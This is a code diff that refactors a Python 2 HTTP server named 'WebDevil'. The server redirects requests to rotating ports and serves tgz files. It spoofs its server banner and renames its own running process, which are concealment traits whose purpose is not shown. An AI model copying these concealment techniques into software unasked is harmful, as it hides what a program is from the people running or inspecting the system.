@@ -184,36 +184,36 @@ for PORT in range(sIMP, eIMP+1):
 
 
 if SERVER_PORT != sIMP:
-    try:
-        class WebDevil(SocketServer.ThreadingMixIn, BaseHTTPServer.BaseHTTPRequestHandler):
+    class WebDevil(SocketServer.ThreadingMixIn, BaseHTTPServer.BaseHTTPRequestHandler):
+
+        # Spoof Some Server info
+        server_version = 'WebDevil'
+        sys_version = VERSION
+        error_message_format = 'User Error Detected ;-)'
+        print('WebDevil: Loaded Successfully')
+
+        def do_GET(self):
 
             # Spoof Some Server info
-            server_version = 'WebDevil'
-            sys_version = VERSION
-            error_message_format = 'User Error Detected ;-)'
-            print('WebDevil: Loaded Successfully')
+            self.server_version = 'WebDevil'
+            self.sys_version = VERSION
 
-            def do_GET(self):
+            global cPORTS
+            PATH = self.path
+            set_proc_name(pPROC_NAME)
 
-                # Spoof Some Server info
-                self.server_version = 'WebDevil'
-                self.sys_version = VERSION
-
-                global cPORTS
-                PATH = self.path
-                set_proc_name(pPROC_NAME)
-
-                # Redirect if not requesting files
-                if not 'tgz' in PATH:
-                    if cPORTS > eIMP:
-                        cPORTS=sIMP
-                    self.send_response(200)
-                    self.send_header("Content-type", "text/html")
-                    self.end_headers()
-                    self.wfile.write('<html><META HTTP-EQUIV="REFRESH" CONTENT="0; URL=http://'+SERVER_DOMAIN+':'+str(cPORTS)+PATH+'"></html>')
-                    cPORTS+=1
+            # Redirect if not requesting files
+            if not 'tgz' in PATH:
+                if cPORTS > eIMP:
+                    cPORTS=sIMP
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write('<html><META HTTP-EQUIV="REFRESH" CONTENT="0; URL=http://'+SERVER_DOMAIN+':'+str(cPORTS)+PATH+'"></html>')
+                cPORTS+=1
 
         DevilDaemon = BaseHTTPServer.HTTPServer((SERVER_ADDRESS, SERVER_PORT), WebDevil)
+    try:
         DevilDaemon.serve_forever()
     except:
         os.system('pkill WebImp')
